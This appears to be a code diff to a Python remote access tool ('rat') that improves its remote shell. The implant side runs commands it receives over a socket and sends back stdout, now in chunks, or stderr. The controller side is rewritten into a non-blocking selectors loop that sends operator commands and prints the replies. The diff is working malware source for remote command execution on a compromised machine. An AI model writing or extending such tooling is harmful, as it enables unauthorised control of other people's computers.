@@ -67,11 +67,19 @@ def change_dir(commands, conn):
 
 # Called by remote shell, executes the command sent and sends stdout or stderror.
 def execute(commands, conn):
+    total_sent = 0
     execution = subprocess.run(commands, capture_output=True)
+    print(execution)
     if execution.stdout:
-        conn.send(execution.stdout)
-    else:
+        message_length = len(execution.stdout)
+        print(message_length)
+        while total_sent < message_length:
+            sent = conn.send(execution.stdout[total_sent:])
+            total_sent += sent
+    elif execution.stderr:
         conn.send(execution.stderr)
+    else:
+        conn.send(b'Empty')
 
 
 # Controller socket, connects to rat socket and receives a shell.
@@ -82,17 +90,30 @@ def controller():
     try:
         client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_sock.connect((address, port))
-        client_connup = True
-        while client_connup:
-            ccmd = input('command: ')
-            client_sock.send(ccmd.encode())
-            msg = client_sock.recv(1024)
-            if msg:
-                print(msg.decode())
-            else:
-                print('No reply')
+        client_sock.setblocking(False)
+        sel.register(client_sock, selectors.EVENT_WRITE, controller_output)
     except ConnectionRefusedError:
         print('CONNECTION REFUSED')
+
+
+def controller_output(client_sock):
+    try:
+        ccmd = input('Command: ')
+        message = ccmd.encode()
+        if message:
+            client_sock.send(message)
+            sel.modify(client_sock, selectors.EVENT_READ, controller_receive)
+    except Exception as e:
+        print(f'Error occurred in controller_output {e}')
+
+
+def controller_receive(client_sock):
+    try:
+        received = client_sock.recv(4096)
+        print(received.decode())
+        sel.modify(client_sock, selectors.EVENT_WRITE, controller_output)
+    except Exception as e:
+        print(f'Error occurred in controller receive {e}')
 
 
 parser = argparse.ArgumentParser(
